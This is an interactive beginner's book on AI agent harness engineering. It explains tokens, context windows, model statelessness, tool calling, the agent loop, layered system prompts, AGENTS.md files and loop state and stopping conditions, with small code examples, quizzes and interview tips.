Harness Engineering, Wire by Wire

Harness Engineering, Wire by Wire

An interactive book that starts at zero, explains every system around an AI model one wire at a time, and ends with a working harness you built yourself and can defend in an interview.

Agent = Model + Harness

Start from zero Continue: See the map
35 chapters23 hands-on labs1 harness, built in 11 stepsUpdated September 2026
Tap a connector. Each colored wire is one system of the harness, and it keeps the same color all through the book.

What you will be able to do

By the last page you will be able to explain how an AI agent works in plain words, draw the architecture of a real harness like Claude Code from memory, design one for a new problem, build a small one in Python with tests and evals, and talk about all of it with the calm of someone who has actually done it.

You do not need any AI background. You need to be able to read a little code in any language, and to be willing to press buttons in the labs and guess before you look.

How this book works

A short tour of the rhythm every chapter follows, the colors you will see, and a realistic plan for getting through it.

One rhythm, every chapter

Each chapter moves through the same five beats. You will get used to them quickly.

  1. Read. A plain explanation. Short sentences, no unexplained words. Any word with a dotted underline, like harness or token, can be tapped for a definition.
  2. See. A picture or a comparison that makes the idea visible.
  3. Try. A lab you can play with. Most labs start with a "Predict first" question. Answer it in your head before you touch anything. Guessing first, then checking, is one of the most reliable ways people learn, because your brain notices the gap between what you expected and what happened.
  4. Check. A few questions. When you get one wrong, the explanation tells you why the tempting answer is tempting.
  5. Carry. A dark box with the ideas to keep, and an "Interview lens" note showing how the idea gets asked about in real interviews.

The eight wire colors

A harness has eight systems. This book gives each one a wire color, the way electricians color-code the wires in a car's wiring harness so anyone can trace a circuit. Every chapter header shows which wires it touches.

Control planeLoop and stateToolsPermissions and sandboxContext and memoryErrors and recoveryVerification and evalsObservability

The path

Part 1 explains what a model is and why it cannot be trusted alone. Part 2 turns a chatbot into an agent. Part 3 takes the eight wires one at a time. Part 4 studies real harnesses and the daily craft. Part 5 is the build: you write Rein, a small but complete harness, with tests and evals. Part 6 turns it all into a job.

A realistic plan

At about 12 to 15 focused hours a week, this path takes around ten weeks. You can read straight through and build at the end, or build each step as soon as its chapter is done. Both work; building alongside makes ideas stick sooner.

WeeksReadDo
1Parts 1 and 2Every lab. Write the agent loop from memory on paper.
2 to 4Part 3, chapters 9 to 16Build steps 1 to 6 as you go.
5Part 3, chapters 17 to 20Build steps 7 to 9.
6Part 4Read two primary sources from the reading list.
7 to 8Part 5Finish Rein, run real evals, record numbers.

This field changes monthly. Facts in this book are dated and tied to their source, and company numbers are the companies' own reports. When something here disagrees with a newer primary source, trust the newer source. Checking is itself part of the job.

Carry this forward

  • Predict before you press. The surprise is where learning happens.
  • Tap dotted words whenever you are not sure. Never skip a word you do not know.
  • Colors mean systems. You will start to see the same eight wires in every agent you meet.

What a language model really does

Strip away the chat window and a language model does exactly one thing: it looks at text and guesses the next small piece of it. Everything else is built on top.

Autocomplete, grown up

Your phone keyboard suggests the next word as you type. It learned those suggestions from what people usually write. A large language model, or LLM, does the same thing at a vastly larger scale. It was trained on an enormous library of text and code, and from that it learned patterns: grammar, facts, styles, how programs are written, how arguments are built.

When you ask Claude a question, the model is not looking anything up. It is predicting what text is most likely to come next, given everything written so far, one piece at a time.

Look at step 3 closely. The model does not produce one answer. It produces a score for every possible next token, which becomes a set of probabilities: "salt" might get 58 percent, "pepper" 19 percent, "rocket fuel" almost nothing. Then something has to choose. That choice is called sampling.

Temperature: how adventurous the choice is

A setting called temperature controls the choice. At a low temperature the top option wins almost every time, so answers are predictable. At a high temperature the lower options get real chances, so answers are more varied, and sometimes strange.

Near temperature 0.1, how often will "salt" be picked? And at 2.0, will "rocket fuel" ever appear in 20 tries?

Notice what happened when you pressed "Run it 20 times" at the default temperature. Same prompt, same model, different words. This is not a bug. It is how the model is used on purpose, because a little randomness makes writing feel natural. But for an engineer it has a big consequence: you cannot test a model once and assume you know how it behaves. Chapter 19 turns that fact into a whole measurement practice.

Training and using are different jobs

Training is how the model learns its patterns. It takes months, huge computers, and it is done by AI labs. The result is a file of numbers called weights. Using the model, called inference, means sending it text and getting text back. That is where you will work.

After the first round of training, labs do more training to teach the model to follow instructions, to hold a conversation, and to ask for tools in a structured way. That last skill is why agents are possible at all. But the core stays the same: text in, next token out.

Think of a brilliant new hire who has read every book in the library but has never been inside your company. They speak well and know a lot. But they cannot open your files, they forget each conversation the moment it ends, and sometimes they state a guess as if it were a fact. Everything in this book is about how to give that person a desk, tools, rules, a notebook, and a supervisor.

Why a harness engineer cares

Because the model only produces text, it cannot on its own run code, read your files, remember yesterday, check a fact, or stop itself from doing something dangerous. Every one of those abilities has to be added from the outside, by ordinary software. That outside software is the harness, and building it well is the job this book prepares you for.

A model gives two different answers to the exact same question. What is the most likely reason?

  • The model learned something new between the two questions.
  • The next token is picked by sampling, so the same scores can lead to different choices.
  • The API was broken the first time.

The model's weights do not change between your calls; it does not learn while you use it. Different answers come from sampling: the same probabilities, a different roll of the dice.

Which of these can a language model do with no help from any other software?

  • Read a file on your laptop.
  • Remember what you told it last week.
  • Write text that looks like a plan for reading a file.

The model can only produce text. It can write a very good plan, or a request to read a file, but actually reading the file needs software around it.

Carry this forward

  • A model turns text into scores for the next token, picks one, and repeats.
  • Sampling makes outputs vary. One test run proves very little.
  • The model only writes text. Every action, memory, and safety rule comes from the harness.

"Explain an LLM to someone non-technical in one minute." A strong answer: it is autocomplete trained on a huge library; it predicts the next piece of text over and over; it is fluent but it does not look things up or check itself, which is why real products wrap it in software that gives it tools, memory, and checks.

Tokens and the context window

Models do not read letters or words. They read tokens, and they can only hold so many at once. Almost every harness decision about cost, speed, and memory starts here.

What a token is

A tokenizer cuts text into pieces called tokens. Common words are usually one token. Rare words split into several. Spaces and punctuation count too. For English text, a rough rule is about four characters per token, so 1,000 words is roughly 1,300 tokens. Code and other languages can use more.

Will the long medical word be one token or many? Which sample will use the most tokens per character?

Why tokens run everything

Three things are measured in tokens, and all three shape harness design:

  • Cost. APIs charge per token, separately for input (what you send) and output (what the model writes). Output tokens usually cost several times more than input tokens.
  • Speed. The model writes output one token at a time, so long answers take longer. Reading input is much faster, but huge inputs still add delay.
  • Limits. Every model has a maximum number of tokens it can take in at once. That limit is the context window.

The context window is a desk

The context window is everything the model can see on one call. Picture a desk. Everything relevant must be on the desk at the same time, and nothing else exists for the model. On an agent's desk you will find:

Modern windows are large: in 2026, between about 200,000 and a million tokens for leading models. That sounds like plenty until an agent starts working. A system prompt is a few thousand tokens. Tool descriptions can be several thousand more, and connecting a handful of tool servers can add tens of thousands. Reading one large file might be 10,000 tokens. One test run with a long log can be 20,000. A busy session fills the desk faster than you would guess.

"The window is huge, so just put everything in." Two problems. You pay for every token on every call, and models get worse at using information as the input grows, a problem called context rot. A bigger desk does not mean a clearer mind. Chapter 13 is all about this.

Input limit, output limit

There are two separate limits. The context window bounds everything the model reads. A second setting, called max_tokens in Claude's API, bounds how much it may write in one reply. If the model hits that output limit mid-sentence, the reply is simply cut off, and the harness has to notice and decide what to do. You will build exactly that logic in Step 8 of the build.

An agent has a 200,000-token window. It has used 150,000 tokens so far. It now reads a log file of 60,000 tokens. What happens?

  • The request no longer fits, so the API refuses it unless the harness trims or summarizes something first.
  • The model reads the first 50,000 tokens of the log automatically.
  • The model forgets the oldest messages on its own.

The API does not trim for you by default; an oversized request is simply rejected. Deciding what to cut is the harness's job, which is why harnesses cap tool outputs and compact history before they hit the wall.

Carry this forward

  • Tokens are the unit of cost, speed, and limits. Roughly four English characters each.
  • The context window is the model's whole world for one call. If it is not on the desk, it does not exist.
  • Big windows are not free: every token costs money and attention.

"Why does context size still matter now that windows are huge?" Cost scales with tokens on every call; latency grows; quality drops as inputs grow (context rot); and a stable, compact prompt is what makes caching work. Good harnesses treat context as a budget, not a bucket.

The model has no memory

Each call to a model starts from nothing. The feeling that a chatbot "remembers" you is created by software that re-sends the conversation every single time.

Stateless, like a vending machine

A model API is stateless. You send a request, you get a response, and the model keeps nothing. The next call knows nothing about the last one. It is closer to a vending machine than to a person: same buttons, same kind of result, no memory of who pressed them before.

So how does a chat app remember your name? The app keeps a list of every message, and on each turn it sends the entire list again. The model reads the whole conversation from the top, every time, as if for the first time.

{
  "system": "You are a helpful assistant.",
  "messages": [
    {"role": "user",      "content": "Hi! My name is Amina."},
    {"role": "assistant", "content": "Nice to meet you, Amina!"},
    {"role": "user",      "content": "What's my name?"}
  ]
}

With the switch off, what will the model say when you ask "What's my name?" on turn 2?

Four consequences you will meet again and again

1. The harness owns memory. Deciding what the model "remembers" is not a model feature; it is your code. That is the first and most basic job of any harness.

2. Memory costs tokens, every turn. Because the whole history is re-sent, a long conversation gets more expensive with each turn. The total cost of a session grows much faster than its length. Prompt caching (chapter 14) is the main cure.

3. What the model cannot see does not exist. A rule mentioned once, early, and later summarized away, is gone. OpenAI's harness team put it bluntly in 2026: from the agent's point of view, knowledge that is not in its context, or in files it can reach, simply does not exist.

4. Anything that must outlive the window needs to leave it. Files, notes, databases, and git history are how agents remember across sessions. Part 4 shows how long-running agents use them.

The main character in the film Memento cannot form new memories, so he writes notes, takes photos, and tattoos key facts on his skin. Every morning he reads them to know who he is and what he is doing. A well-built agent works the same way: the model forgets, the harness keeps the notes.

Three kinds of memory

KindWhere it livesCan you change it at runtime?
Learned knowledgeThe model's weightsNo. Only more training changes it.
Working memoryThe messages in the context windowYes, and it is gone after the call.
Long-term memoryFiles, notes, databases, gitYes, and it survives across sessions.

Your agent followed a rule perfectly for an hour, then started breaking it. The rule was stated once, in the first user message. What is the most likely cause?

  • The model got tired.
  • The model's weights changed during the session.
  • The early message was summarized or trimmed away, so the rule was no longer in the context.

Models do not tire, and their weights do not change while you use them. Rules that must always hold belong in a place the harness re-sends every turn, like the system prompt or a rules file, not in a message that can be compacted away.

Carry this forward

  • Every model call starts from zero. The harness re-sends the history to fake memory.
  • Memory has a price in tokens that grows with every turn.
  • Important rules must live where they are re-sent every time.

"How does a chat assistant remember earlier messages?" It does not; the application stores the conversation and re-sends it on every call. Mention the cost growth, the need to trim or summarize long histories, and that durable memory lives outside the context in files or databases.

Why a model alone is not reliable

A model can write brilliant code and still be the least trustworthy part of your system. Harness engineering starts by accepting that.

Six ways a model lets you down

WeaknessWhat it looks like
HallucinationA confident, fluent answer that is false: a function that does not exist, a wrong date, an invented citation.
RandomnessDifferent answers to the same request, so one good run proves little.
DriftRules followed early, then quietly broken as the context grows.
Self-praiseAsked to judge its own work, a model tends to approve it. Anthropic's engineers reported in 2026 that agents confidently praised work that was obviously mediocre to a human.
No ground truthIt cannot check a fact, run a test, or look at a file unless the harness gives it a way.
Stale knowledgeIt knows the world only up to its training date, so it may use an API that was renamed last month.

If you ask 20 times, how many wrong years will you get at temperature 1.0? Will the wrong answers sound less sure than the right ones?

The lesson of that lab is the key to the whole field: wrong answers do not look different from right ones. The model does not whisper when it is unsure. So the checking has to come from outside.

Small errors multiply

An agent does not answer once. It takes many steps, and each step can go wrong. If every step succeeds 99 percent of the time, a 50-step task succeeds only about 60 percent of the time, because 0.99 multiplied by itself 50 times is about 0.6. At 95 percent per step, a 20-step task finishes cleanly only about a third of the time.

The first principle

Treat the model as a powerful but unstable component, not as a teammate. A teammate can be trusted with responsibility. A component gets limits, checks, logs, and a way to roll back. The sooner a system accepts this, the sooner it grows permission boundaries, recovery paths, and verification gates.

This is not pessimism. Engineers have always built reliable systems out of unreliable parts. Networks drop packets, so we built retries and checksums. Disks fail, so we built backups and redundancy. A model is a new kind of unreliable part: extremely capable, and wrong in new ways. The harness is how we make it dependable.

"But models keep getting better"

They do, fast. So why not wait? Three reasons. First, reliability needs compound: even excellent per-step accuracy leaves long tasks fragile, as the chart shows. Second, once a model can act, a rare mistake can be expensive: one deleted database outweighs a thousand saved hours. Third, businesses need things models do not provide at all: cost limits, audit trails, approvals, and proof that work was checked.

Better models do change which harness parts are needed. A theme you will meet in chapter 24: every harness component encodes an assumption about what the model cannot do, and good engineers test those assumptions again when a new model arrives.

An agent step succeeds 98 percent of the time and the task needs 30 steps. Roughly how often does the whole task succeed with no errors?

  • About 98 percent
  • About 55 percent
  • About 30 percent

0.98 to the power of 30 is about 0.55. Per-step success does not carry over to the whole task; it multiplies. This is why verification and recovery matter so much for long tasks.

What is the most reliable way to catch a hallucinated function name in generated code?

  • Run the code or its tests, and feed any error back to the agent.
  • Ask the model whether it is sure.
  • Lower the temperature to zero.

Asking the model to double-check helps a little, and low temperature makes answers consistent, not correct. A computational check such as running the code gives ground truth.

Carry this forward

  • Wrong answers look exactly like right ones. Checks must come from outside the model.
  • Per-step errors multiply over long tasks.
  • Treat the model as an unstable component; the harness makes it dependable.

"If models keep improving, why invest in harnesses?" Talk about compounding errors on long tasks, the cost of rare but serious mistakes once agents can act, and business needs like audit and cost control. Then add the senior point: harness parts should be re-tested and removed when a model makes them unnecessary.

Tools: giving the model hands

A model can only write text. A tool lets that text become an action, but only because the harness agrees to carry it out.

The trick, in one sentence

The harness tells the model which tools exist. The model, instead of answering in prose, writes a small structured request: "please run read_file with path calc.py". The harness runs it, then sends the result back. That structured request is a tool call.

What it looks like on the wire

With Claude's API, you describe each tool with a name, a description, and an input_schema written in JSON Schema, a standard way to describe the shape of data.

{
  "name": "read_file",
  "description": "Read a text file from the project, with line numbers. Long files come in pages of 200 lines.",
  "input_schema": {
    "type": "object",
    "properties": {
      "path": {"type": "string", "description": "Path relative to the project root, e.g. src/app.py"}
    },
    "required": ["path"]
  }
}

When the model wants the tool, its reply contains a tool_use block and the reply's stop_reason is "tool_use". The harness runs the tool and answers with a tool_result block carrying the same id, so the model knows which request the result belongs to.

// The model's reply (stop_reason: "tool_use")
{"type": "tool_use", "id": "toolu_01A", "name": "read_file", "input": {"path": "calc.py"}}

// The harness's next message (role: "user")
{"type": "tool_result", "tool_use_id": "toolu_01A", "content": "1  def add(a, b):\n2      return a - b"}

A model may ask for several tools in one reply, for example reading two files at once. Every request must get exactly one matching result, or the next API call is rejected. In Step 8 of the build, you make Rein keep this rule even when you press Ctrl+C in the middle of a tool call.

The model proposes, the harness disposes. The model never runs anything. It can only ask. Every safety feature in this book, from permissions to sandboxes, lives in the gap between the request and the execution.

The same idea everywhere

OpenAI calls this function calling; the shape is nearly the same. The Model Context Protocol, or MCP, goes one step further and standardizes how tools are offered by separate servers, so one integration can work in many apps. Chapter 11 covers it.

A tool is a user interface for a model

The model decides whether and how to call a tool based only on the words you give it: the name, the description, and the input descriptions. A vague tool gets used badly. Try building one and see what a model would stumble on.

Load the weak tool. Before reading the warnings, list two things you think a model would get wrong with it.

The model replies with two tool_use blocks. The harness runs the first and skips the second. What happens on the next call?

  • Nothing; the model will notice and ask again.
  • The API rejects the request, because every tool_use needs a matching tool_result.
  • The second tool runs automatically on the next turn.

The history must stay well-formed: one tool_result per tool_use, matched by id. If a call is skipped or denied, the harness still sends a result, for example an error saying it was not run.

Carry this forward

  • A tool call is a structured request. The harness decides whether to run it.
  • Every tool_use gets exactly one tool_result, matched by id.
  • Names and descriptions are the model's only manual. Write them like onboarding a new colleague.

"Walk me through what happens when an LLM uses a tool." Harness sends tool schemas; model returns a tool_use block with stop_reason tool_use; harness validates, checks permission, executes, and returns a tool_result with the same id; the loop calls the model again. Stress that the model never executes anything itself.

The agent loop

Put tool calling inside a loop and something new appears: a program that decides its own next step. That loop is the heartbeat of every agent ever built.

Ten lines that change everything

One tool call is useful. But real tasks need many: look around, read, change, test, fix, test again. So we call the model, run whatever tools it asks for, add the results to the history, and call it again, until it stops asking. Here is the whole idea in Python-like pseudocode:

messages = [{"role": "user", "content": task}]
for turn in range(MAX_TURNS):                 # a hard stop, always
    reply = model(system_prompt, messages, tools)
    messages.append({"role": "assistant", "content": reply.content})
    if not reply.tool_calls:                   # no request: the model thinks it is done
        return reply.text
    results = [run(call) for call in reply.tool_calls]   # the harness acts
    messages.append({"role": "user", "content": results})
return "Stopped: turn limit reached"

This pattern has a name from a 2022 research paper: ReAct, for reason and act. The model thinks, acts through a tool, observes the result, and repeats. Almost every modern agent, from Claude Code to Codex, is this loop with a great deal of engineering around it.

How many times will the model be called to fix one bug? Then flip "Remove the loop" and guess what the user gets back.

What the loop does with each stop reason

Every model reply says why it stopped. The loop must handle each case on purpose.

stop_reasonMeaningWhat the loop should do
tool_useThe model wants tools run.Check, run, send results, loop again.
end_turnThe model thinks it is finished.Treat it as a claim: verify, then return or send back.
max_tokensThe reply was cut off.Ask it to continue, or retry in smaller steps. Never trust a half-written tool call.
anything elseA refusal, a pause, or a new case.Handle it explicitly or stop and report. Never ignore it.

A loop needs more than one exit

The pseudocode above has two exits: the model says it is done, or a turn limit is reached. Real harnesses add more: a token or cost budget, a time limit, a circuit breaker for repeated failures, loop detection for "same action again and again", and a human pressing stop. Chapter 10 treats stopping as a design problem of its own.

A heartbeat, not a single pulse. Each beat picks up exactly where the last one left off, with the same body and the same condition. A system without a loop is like a doctor who can only take one pulse and must then forget the patient.

Where the other seven wires plug in

Look at the loop again, because every other system in this book attaches to it at a specific spot:

  • Before each call: the control plane builds the prompt, and context management trims or compacts the history.
  • The call itself: recovery retries transient failures and counts them.
  • After the call: permissions check each tool request; tools run; outputs get capped.
  • At the "done" claim: verification checks the work.
  • Everywhere: observability records what happened.

Your loop only stops when the model says it is done. What is the most likely failure in production?

  • It stops too early on easy tasks.
  • It uses fewer tokens than expected.
  • On a confusing task it keeps calling tools forever, burning money, until someone notices.

A single exit that depends on the model's judgment is exactly the exit that fails when the model is confused. Hard limits on turns, tokens, and time are not optional.

Carry this forward

  • Agent = model called in a loop, with tool results fed back each turn.
  • Handle every stop_reason on purpose. "Done" is a claim, not a fact.
  • Every other harness system plugs into a specific point of this loop.

"Write an agent loop on the whiteboard." This is common. Write the ten lines, then improve them out loud: add a turn limit and budget, handle max_tokens, send errors back as tool results, add a permission check before execution, and a verification step at the end. Showing how the minimal loop grows into a harness is the point of the question.

So what is a harness?

A harness is everything in an agent that is not the model. That sounds like a joke definition, but it is the most useful one the field has.

Where the word comes from

A horse's harness is the set of straps, reins, and blinkers that turns a strong, unpredictable animal into a team that can plough a field. The horse supplies the power. The harness supplies the direction, the limits, and the connection to the load. Blinkers even limit what the horse can see, so it is not distracted, which is exactly what context engineering does for a model.

Software already used the word: a "test harness" runs code under controlled conditions. And cars have a wiring harness, the color-coded bundle that connects the engine to everything else, which is the picture this book uses.

The formula

Agent = Model + Harness. The model holds the intelligence. The harness makes that intelligence useful: prompts, tools, the loop, permissions, context management, recovery, verification, and tracing. LangChain's version is even shorter: if you are not the model, you are the harness.

Researchers have tried to pin it down more carefully. A June 2026 paper proposed that a system counts as an agent harness when it has four things together: an agent loop, a tool interface, context management, and control mechanisms such as permissions and limits. A plain wrapper around an API call is not a harness. A guardrail filter by itself is not a harness either. It is one part of one.

How we got here

EraThe question people asked
Prompt engineering (2022 to 2024)What words should I send to get a good answer?
Context engineering (2025)What should be in the model's window on each call, and what should stay out?
Harness engineering (2026)What whole system around the model makes it do reliable work over many steps?

Each era contains the one before. The name took off in February 2026, when Mitchell Hashimoto described "engineering the harness" as a step in his own AI workflow, and OpenAI published a field report called "Harness engineering" about a team that shipped a product whose code was written entirely by agents. By September 2026 even management consultancies were publishing guides on it.

Evidence that the harness matters

LangChain reported moving its coding agent from outside the top 30 to the top 5 on the Terminal-Bench 2.0 benchmark by changing only the harness: self-verification loops, better context injection, and loop detection. Same model. Anthropic reported that harness and infrastructure setup alone can swing benchmark scores by several percentage points, and in one experiment a full harness produced a working app where a single agent run produced one whose core feature was broken.

Sources: LangChain, "Improving Deep Agents with harness engineering" (2026); Anthropic, "Harness design for long-running application development" (March 2026) and "Quantifying infrastructure noise in agentic coding evals" (2026).

The operating-system picture

Philipp Schmid offered a comparison that engineers find easy to hold in their heads:

ComputerAgentWhy it fits
CPUThe modelRaw processing power, useless without the rest.
RAMThe context windowFast, small, wiped between runs.
Operating systemThe harnessSchedules work, manages memory, controls permissions, handles errors.
ApplicationThe agent you shipWhat the user actually experiences.

Two harnesses, nested

There are two places you can do harness engineering, and interviewers like to ask about both.

  • The product harness. Claude Code, Codex, or the agent you build: the loop, tools, permissions, and compaction inside the product.
  • The user harness. What a team builds around an existing agent: an AGENTS.md file, tests, linters with helpful error messages, hooks, CI checks, sandboxes. Birgitta Böckeler at Thoughtworks calls this harness engineering for coding agent users.

Both follow the same principles. Most working engineers start with the second and grow into the first.

Neighboring words, sorted out

WordWhat it means
FrameworkA library of building blocks for harnesses, such as LangGraph, Google ADK, or the Claude Agent SDK.
ScaffoldAn older word for roughly the same thing as harness, common in research papers.
OrchestratorThe part that coordinates several agents or steps.
GuardrailsSafety checks on inputs and outputs. One part of a harness.
Eval harnessA rig for running evaluations. Older meaning; do not mix it up with an agent harness.

A team swaps nothing but their system prompt, tool descriptions, and compaction threshold, and their agent's success rate jumps. What changed?

  • The harness.
  • The model.
  • Neither; it was probably luck.

All three are harness parts. Luck is worth ruling out with repeated trials (chapter 19), but the change itself is pure harness engineering.

Carry this forward

  • Agent = Model + Harness. If it is not the weights, it is harness.
  • Prompt, context, and harness engineering are nested, not rivals.
  • Harnesses exist inside products and around them. Both count.

"Prompt engineering vs context engineering vs harness engineering?" Prompt engineering is about wording. Context engineering is about what fills the window each call. Harness engineering is the whole runtime: loop, tools, permissions, recovery, verification, observability, and evals. Give one concrete example of each.

The map: eight wires

Every serious harness answers the same eight questions. Learn the questions and you can read any agent's design, including ones that do not exist yet.

One question per wire

WireThe question it answersChapters
Control planeWhat is the model told, and which instruction wins?9
Loop and stateWhat happens next, what do we carry, and when do we stop?6, 10
ToolsWhat can the model do, and is each tool easy for a model to use?5, 11
Permissions and sandboxWhich actions are allowed, and how bad can a mistake get?12, 20
Context and memoryWhat is on the desk this call, and what is saved for later?2, 13, 14
Errors and recoveryWhen something fails, how do we continue without spinning forever?15
Verification and evalsHow do we know the work is really done, and did our change help?16, 19
ObservabilityWhat exactly happened, and where did the time and money go?18

One turn, all eight wires

Follow a single turn of a coding agent and watch every wire do its job:

  1. The control plane assembles the system prompt: base rules, then the project's AGENTS.md.
  2. Context management checks the budget. The history is at 81 percent, so it compacts old turns first.
  3. The loop calls the model. The API says "overloaded". Recovery waits two seconds and retries. It works.
  4. The model asks for two tools: read a file and run a shell command.
  5. Permissions allow the read and ask a human about the command. The human says no. The harness returns "denied" as a result so the model can adapt.
  6. Later the model says "done". Verification runs the tests. Two fail. The harness sends the failures back.
  7. Throughout, observability writes every event to a trace, so tomorrow you can see why this run took 40 minutes.

Under all eight wires sits one question: how do we get useful work from a powerful, unreliable component without letting a mistake become expensive? Layered prompts answer it for behavior. The loop answers it for continuity. Permissions answer it for actions. Context management answers it for memory. Circuit breakers answer it for failure. Independent checks answer it for trust. Traces answer it for understanding.

Two things are not separate wires in this map but will get their own chapters, because they combine several wires: multi-agent designs (chapter 17) and long-running work across many sessions (chapter 23).

Rein, the harness you build in Part 5, has all eight wires in one Python file of about 570 lines, so you will have touched every one of them yourself.

An agent finished a task, but nobody can explain why it took 40 minutes and cost ten dollars. Which wire was weakest?

  • Tools
  • Observability
  • Control plane

Other wires may have caused the slowness, but the reason nobody can explain it is missing observability. Without traces, every investigation is guesswork.

Carry this forward

  • Eight wires, eight questions. Use them as a checklist for any agent design.
  • Each wire attaches to a specific point of the loop.
  • The single question under all of them: useful work without expensive mistakes.

In design interviews, name the wires out loud as a checklist: "Let me walk through control, loop, tools, permissions, context, recovery, verification, and observability." It shows structure, and it stops you forgetting the unglamorous parts that interviewers are listening for.

Control plane: instructions as law

A beginner treats the system prompt as personality: "be friendly, be helpful". A harness engineer treats it as law, with layers, precedence, and a way to prove each rule matters.

Constitution, not costume

The control plane is every part of the harness that decides how the agent behaves: the system prompt, project rules, tool schemas, and hooks. Its most visible part is the prompt, and the most common mistake is to write it as a character description. Good system prompts read more like a short legal code: what the agent is for, what it must never do, how it should work, and what it must report.

The deletion test. For any section of a prompt, ask: if I removed it, would behavior change in a way my evals can see? If yes, it is real control logic. If no, it is decoration, and decoration costs tokens and attention on every call.

Layers, rebuilt every turn

One giant prompt that tries to cover everything collapses under its own weight: new rules contradict old ones and nobody knows which wins. Mature harnesses assemble the prompt from layers, each with one job. Public analyses of Claude Code describe a prompt assembled fresh on every turn from several sources, in a fixed order: defaults, the project's CLAUDE.md, custom instructions, agent-specific instructions, and appended text. Each layer can add detail, and a clear order decides conflicts.

Company policy, then department policy, then your manager's instructions, then today's one-off request. Each level adds detail. A clear order stops them from silently contradicting each other, and some company policies, like safety rules, cannot be overridden by anyone below.

For the "push to main" question, switch off the safety layer. Whose rule takes over, and why is that dangerous?

Words guide, code enforces

A rule written in a prompt is a request. A rule written in code is a guarantee. Use each for what it is good at.

If breaking the rule would...Put it inExample
Just be a little worseThe prompt or AGENTS.md"Prefer small functions."
Break the build or styleA linter or test, with a helpful error message"Modules may not import from the UI layer."
Cause real damagePermissions and the sandbox"Never push to main." "Never touch files outside the repo."

The right altitude

Anthropic's guidance on context engineering describes two ways to write a bad prompt. One is too low: dozens of brittle if-this-then-that rules that break on the first case you did not predict. The other is too high: vague goals like "write good code" that give the model nothing to act on. The right altitude sits between: clear principles, the few hard rules, and examples of what good looks like.

"You are an expert engineer. Write high-quality, clean, well-tested code. Be careful."

Nothing here changes behavior. Every model already believes it writes clean code.

"If the file is Python and longer than 200 lines and has no tests, first create tests/test_X.py, unless X starts with an underscore, in which case..."

Rules like this multiply until they contradict each other.

"Read before you change anything. Make the smallest change that solves the task. Never claim something works unless you ran a check that proves it. If a tool is denied, do not retry it; find another way or explain what you need."

Few rules, each one testable, each one closing a real failure mode.

AGENTS.md: a map, not a manual

AGENTS.md is a plain file in a repository that tells coding agents how to work there. It started in 2025, is read by most coding agents, and is now stewarded under the Linux Foundation's Agentic AI Foundation alongside MCP. Claude Code reads its own CLAUDE.md in the same spirit.

OpenAI's harness team learned a hard lesson: a giant instruction file fails. It crowds out the task, rots as the code changes, and when everything is marked important, nothing is. Their fix was an AGENTS.md of roughly 100 lines that works as a table of contents, pointing to a docs/ folder that serves as the system of record. The agent reads the map first and opens deeper documents only when needed. That idea is called progressive disclosure, and you will see it again with skills.

Every prompt line is code

In April 2026 Anthropic published a postmortem on a period of lower Claude Code quality. They traced it to three separate harness changes: a lower default reasoning effort, a caching bug that dropped earlier reasoning from sessions, and a system prompt instruction meant to reduce wordiness. Each looked minor. Together they visibly hurt results.

Source: Anthropic engineering, "An update on recent Claude Code quality reports" (April 2026).

The lesson for your own work: version prompts like code, review changes like code, and run evals before and after. A one-line edit to a system prompt is a deploy.

Your team wants to guarantee the agent never runs database migrations on production. Where should that rule live?

  • In bold capital letters at the top of the system prompt.
  • In AGENTS.md, repeated three times.
  • In the harness: a permission rule or sandbox that makes production unreachable, with the prompt only explaining why.

Prompts are requests; models can drift, misread, or be manipulated. When breaking a rule causes real damage, enforce it in code and use the prompt only to explain it, so the agent does not waste turns trying.

Carry this forward

  • Treat the system prompt as law: layered, ordered, and tested with the deletion test.
  • Words guide; code enforces. Costly rules belong in permissions, linters, and sandboxes.
  • Keep AGENTS.md short: a map to deeper docs, not an encyclopedia.

"How would you structure the system prompt for a coding agent?" Layers with a stated precedence; a short set of testable rules; examples of good output; project rules loaded from AGENTS.md; stable content first so it caches; and anything safety-critical enforced in code, not just stated.

Loop state and stopping well

A script only asks "did this step finish?" An agent must also ask "can the next step continue from whatever the last step left behind?" That needs explicit state, and a loop with many honest exits.

State is the core business

Many developers prefer stateless code because it is simpler. Agents cannot avoid state, and ignoring it only makes it come back in messier forms. The loop carries more than messages. Public analyses of Claude Code's source describe one state object for the whole loop holding the messages, the context for tools in flight, compaction tracking, how many times it has recovered from cut-off replies, whether it already tried an emergency compaction, pending tool summaries, and the turn count. Every branch of the loop updates that one object, rather than scattering flags around the code.

from dataclasses import dataclass, field

@dataclass
class LoopState:
    messages: list = field(default_factory=list)
    turn: int = 0
    tokens_used: int = 0
    fix_rounds: int = 0            # how often verification sent work back
    retries_this_turn: int = 0
    compactions: int = 0
    consecutive_failures: int = 0  # feeds the circuit breaker
    status: str = "running"

Exits: one per way a run can end

ExitTriggerWhat the user should hear
DoneModel says finished and verification passesThe result and how it was checked
UnverifiedModel says finished, checks keep failingWhat is done, what still fails, the evidence
LimitTurns, tokens, cost, or time exhaustedWhich limit, and the progress so far
StuckLoop detector sees no progressWhat it kept trying
BrokenCircuit breaker opens on repeated failuresThe failing dependency, clearly
StoppedA human interrupts or deniesConfirmation, with the history left valid

Notice that most exits are not success. That is normal. Designing the failure exits well, with clear messages, is what separates a harness from a demo. Two subtle ones:

  • Premature victory. The model declares success too early. Anthropic's long-running agent work names this as a main failure mode; the fix is verification, not a better prompt.
  • Premature quitting. Some models, as they sense the context filling, start wrapping up early. Anthropic called this "context anxiety". Fixes live in context management: compaction or clean resets with good handoff notes.

Interrupts must close the books

Suppose a user presses stop while a tool is running. The history now contains a tool request with no result, and the next API call will be rejected. A careful harness closes every open request with a synthetic result such as "interrupted by the user before it ran". The record of what happened stays consistent even when the work ends abruptly. Accountants call this closing the ledger.

Pause, resume, repeat

Real work gets interrupted: a deploy needs approval tomorrow, a laptop sleeps, a server restarts. If the loop state is saved outside the process, a run can pause and resume. The "12-Factor Agents" guide from HumanLayer argues agents should be able to launch, pause, and resume through simple interfaces, with the loop acting like a function from state to next state. Anthropic's Managed Agents service goes further: the session log lives outside the harness, so after a crash a fresh harness replays the log and continues.

There is also an outer loop worth knowing. Geoffrey Huntley's "Ralph Wiggum" technique simply runs the agent again and again with the same prompt, while progress lives in files and git. It sounds silly and works surprisingly well, because it moves memory out of the context and into durable artifacts.

A run ended with status "limit: tokens". The user is confused because the agent had printed "almost done!" just before. What should the harness have reported?

  • Nothing more; the status is enough.
  • Which limit was hit, what was completed and verified, and what remains, so the user can decide whether to continue.
  • An apology and the full transcript.

Every exit is a user-facing message. A good one names the cause, the verified progress, and the next step. The model's own "almost done" is a claim, not a status.

Why keep loop state in one object instead of loose variables?

